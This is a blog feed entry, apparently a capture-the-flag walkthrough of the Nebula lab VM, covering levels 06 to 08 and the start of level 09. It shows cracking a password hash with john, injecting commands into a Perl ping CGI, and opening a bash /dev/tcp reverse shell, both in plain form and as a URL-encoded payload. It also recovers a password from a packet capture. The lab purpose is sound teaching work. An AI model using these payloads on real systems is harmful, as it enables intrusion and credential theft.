<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vulnhub | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-06-17T19:51:05+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (06-10)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/17/exploit-exercises-nebula-06-10/"/>
    <updated>2015-06-17T00:05:09+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/17/exploit-exercises-nebula-06-10</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level06</h2>

<p>From the assignment &ldquo;The flag06 account credentials came from a legacy unix
system&rdquo; we conclude that the password is stored in /etc/passwd.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ grep flag06 /etc/passwd
</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span></code></pre></td></tr></table></div></figure></p>

<p>We store credentials to /tmp/hash.txt and use john:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ john /tmp/hash.txt
</span><span class='line'>Created directory: /home/level06/.john
</span><span class='line'>Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
</span><span class='line'>hello            (flag06)
</span><span class='line'>guesses: 1  time: 0:00:00:00 100% (2)  c/s: 75300  trying: 12345 - biteme
</span><span class='line'>Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure></p>

<p>Now we can log using &lsquo;hello&rsquo; password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ su - flag06
</span><span class='line'>Password:
</span><span class='line'>flag06@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<h2>Level07</h2>

<p><figure class='code'><figcaption><span>index.cgi </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="o">!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/perl&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Content</span><span class="o">-</span><span class="n">type:</span> <span class="n">text</span><span class="sr">/html\n\n&amp;rdquo;;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="sr">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span><span class="n">Ping</span> <span class="n">results</span><span class="sr">&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="nv">@output</span> <span class="o">=</span> <span class="sr">&lt;code&gt;</span><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">3</span> <span class="nv">$host</span> <span class="mi">2</span><span class="o">&amp;</span><span class="ow">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="mi">1</span><span class="sr">&lt;/code&gt;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nv">$line</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;;</span> <span class="p">}</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="sr">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="p">}</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="n">check</span> <span class="k">if</span> <span class="n">Host</span> <span class="n">set</span><span class="o">.</span> <span class="k">if</span> <span class="ow">not</span><span class="p">,</span> <span class="n">display</span> <span class="n">normal</span> <span class="n">page</span><span class="p">,</span> <span class="n">etc</span><span class="sr">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Host</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;));</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The configuration file is stored in &lsquo;/home/flag07/thttpd.conf&rsquo;.</p>

<p>Because there is no input validation, we have RCE:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level07@nebula:~$ wget -qO- &ldquo;&lt;a href="http://127.0.0.1:7007/index.cgi?Host=127.0.0.1">http://127.0.0.1:7007/index.cgi?Host=127.0.0.1&lt;/a>&rdquo;
</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.009 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.023 ms&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&mdash; 127.0.0.1 ping statistics &mdash;
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
</span><span class='line'>rtt min/avg/max/mdev = 0.009/0.018/0.023/0.006 ms
</span><span class='line'>&lt;/pre>&lt;/body>&lt;/html>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>level07@nebula:~$ wget -qO- &ldquo;&lt;a href="http://127.0.0.1:7007/index.cgi?Host=127.0.0.1+%3b+id">http://127.0.0.1:7007/index.cgi?Host=127.0.0.1+%3b+id&lt;/a>&rdquo;
</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.027 ms&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&mdash; 127.0.0.1 ping statistics &mdash;
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
</span><span class='line'>rtt min/avg/max/mdev = 0.012/0.020/0.027/0.007 ms
</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)</span></code></pre></td></tr></table></div></figure></p>

<p>Inspired by <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash -i >&amp; /dev/tcp/10.0.0.1/8080 0>&amp;1</span></code></pre></td></tr></table></div></figure>
we can create reverse shell on port 1337 via bash, using ruby to encode our payload:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1337</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;sh-4.2$ ruby -e &amp;ldquo;print &amp;lsquo;&lt;a href=&quot;http:/</span><span class="o">/</span><span class="ss">nebula</span><span class="p">:</span><span class="mi">7007</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">cgi?</span><span class="no">Host</span><span class="o">=</span><span class="s2">&quot;&gt;http://nebula:7007/index.cgi?Host=&lt;/a&gt;&amp;rsquo; + &amp;lsquo;127.0.0.1;bash -i &gt;&amp;amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1;&amp;rsquo;.split(//).map{|x| &amp;lsquo;%&amp;rsquo; + x.ord.to_s(16)}.join + \&amp;rdquo;</span><span class="se">\n</span><span class="s2">\&amp;ldquo;&amp;rdquo;</span>
</span><span class='line'><span class="s2">&lt;a href=&quot;</span><span class="ss">http</span><span class="p">:</span><span class="sr">//ne</span><span class="ss">bula</span><span class="p">:</span><span class="mi">7007</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">cgi?</span><span class="no">Host</span><span class="o">=%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">d</span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">76</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="s2">&quot;&gt;http://nebula:7007/index.cgi?Host=%31%32%37%2e%30%2e%30%2e%31%3b%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%37%2e%30%2e%30%2e%31%2f%31%33%33%37%20%30%3e%26%31%3b&lt;/a&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;sh-4.2$ wget -qO- &amp;ldquo;&lt;a href=&quot;</span><span class="ss">http</span><span class="p">:</span><span class="sr">//ne</span><span class="ss">bula</span><span class="p">:</span><span class="mi">7007</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">cgi?</span><span class="no">Host</span><span class="o">=%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">d</span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">76</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="s2">&quot;&gt;http://nebula:7007/index.cgi?Host=%31%32%37%2e%30%2e%30%2e%31%3b%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%37%2e%30%2e%30%2e%31%2f%31%33%33%37%20%30%3e%26%31%3b&lt;/a&gt;&amp;rdquo;</span>
</span><span class='line'><span class="s2">&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>In the window with nc, we got:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag07@nebula:/home/flag07$ id
</span><span class='line'>id
</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>flag07@nebula:/home/flag07$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<h2>Level08</h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level08@nebula:/home/flag08$ tcpick -C -yU -r capture.pcap
</span><span class='line'>Starting tcpick 0.2.1 at 2015-06-17 05:20 PDT
</span><span class='line'>Timeout for connections is 600
</span><span class='line'>tcpick: reading from capture.pcap
</span><span class='line'>1      SYN-SENT       59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      SYN-RECEIVED   59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      ESTABLISHED    59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>&lt;ff>&lt;fd>%
</span><span class='line'>&lt;ff>&lt;fc>%
</span><span class='line'>&lt;ff>&lt;fb>&amp;&lt;ff>&lt;fd>&lt;18>&lt;ff>&lt;fd> &lt;ff>&lt;fd>#&lt;ff>&lt;fd>&lsquo;&lt;ff>&lt;fd>$
</span><span class='line'>&lt;ff>&lt;fe>&amp;&lt;ff>&lt;fb>&lt;18>&lt;ff>&lt;fb> &lt;ff>&lt;fb>#&lt;ff>&lt;fb>&rsquo;&lt;ff>&lt;fc>$
</span><span class='line'>&lt;ff>&lt;fa> &lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lsquo;&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;01>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa> &lt;00>38400,38400&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;00>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>&rsquo;&lt;00>&lt;00>DISPLAY&lt;01>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;00>xterm&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fb>&lt;03>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fd>&ldquo;&lt;ff>&lt;fd>&lt;1f>&lt;ff>&lt;fb>&lt;05>&lt;ff>&lt;fd>!
</span><span class='line'>&lt;ff>&lt;fd>&lt;03>&lt;ff>&lt;fc>&lt;01>&lt;ff>&lt;fb>&rdquo;&lt;ff>&lt;fa>&ldquo;&lt;03>&lt;01>&lt;00>&lt;00>&lt;03>b&lt;03>&lt;04>&lt;02>&lt;0f>&lt;05>&lt;00>&lt;00>&lt;07>b&lt;1c>&lt;08>&lt;02>&lt;04>    B&lt;1a>
</span><span class='line'>&lt;02>&lt;7f>&lt;0b>&lt;02>&lt;15>&lt;0f>&lt;02>&lt;11>&lt;10>&lt;02>&lt;13>&lt;11>&lt;02>&lt;ff>&lt;ff>&lt;12>&lt;02>&lt;ff>&lt;ff>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;1f>&lt;ff>&lt;fa>&lt;1f>&lt;00>&lt;b1>&lt;00>1&lt;ff>&lt;f0>&lt;ff>&lt;fd>&lt;05>&lt;ff>&lt;fb>!
</span><span class='line'>&lt;ff>&lt;fa>&rdquo;&lt;01>&lt;03>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa>&ldquo;&lt;01>&lt;07>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa>!&lt;03>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;01>&lt;ff>&lt;fd>&lt;00>&lt;ff>&lt;fe>&rdquo;
</span><span class='line'>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fb>&lt;00>&lt;ff>&lt;fc>&ldquo;
</span><span class='line'>&lt;ff>&lt;fa>&rdquo;&lt;03>&lt;03>&lt;e2>&lt;03>&lt;04>&lt;82>&lt;0f>&lt;07>&lt;e2>&lt;1c>&lt;08>&lt;82>&lt;04>   &lt;c2>&lt;1a>
</span><span class='line'>&lt;82>&lt;7f>&lt;0b>&lt;82>&lt;15>&lt;0f>&lt;82>&lt;11>&lt;10>&lt;82>&lt;13>&lt;11>&lt;82>&lt;ff>&lt;ff>&lt;12>&lt;82>&lt;ff>&lt;ff>&lt;ff>&lt;f0>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;01>&lt;00>wwwbugs login:
</span><span class='line'>l
</span><span class='line'>&lt;00>l
</span><span class='line'>e
</span><span class='line'>&lt;00>e
</span><span class='line'>v
</span><span class='line'>&lt;00>v
</span><span class='line'>e
</span><span class='line'>&lt;00>e
</span><span class='line'>l
</span><span class='line'>&lt;00>l
</span><span class='line'>8
</span><span class='line'>&lt;00>8&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;01>
</span><span class='line'>&lt;00>
</span><span class='line'>Password:
</span><span class='line'>b
</span><span class='line'>a
</span><span class='line'>c
</span><span class='line'>k
</span><span class='line'>d
</span><span class='line'>o
</span><span class='line'>o
</span><span class='line'>r
</span><span class='line'>&lt;7f>
</span><span class='line'>&lt;7f>
</span><span class='line'>&lt;7f>
</span><span class='line'>0
</span><span class='line'>0
</span><span class='line'>R
</span><span class='line'>m
</span><span class='line'>8
</span><span class='line'>&lt;7f>
</span><span class='line'>a
</span><span class='line'>t
</span><span class='line'>e&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;00>
</span><span class='line'>&lt;01>
</span><span class='line'>&lt;00>
</span><span class='line'>Login incorrect
</span><span class='line'>wwwbugs login:
</span><span class='line'>1      FIN-WAIT-1     59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      TIME-WAIT      59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      CLOSED         59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>tcpick: done reading from capture.pcap&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>95 packets captured
</span><span class='line'>1 tcp sessions detected</span></code></pre></td></tr></table></div></figure></p>

<p>We can see from the output above that 0x7f represents delete keystore, so the password we are looking for is &lsquo;backd00Rmate&rsquo;</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level08@nebula:/home/flag08$</span> su flag08
</span><span class='line'><span class="go">Password:</span>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Level09</h2>

<p><figure class='code'><figcaption><span>level9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">/./&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="nx">dot</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$email</span><span class="p">);</span>
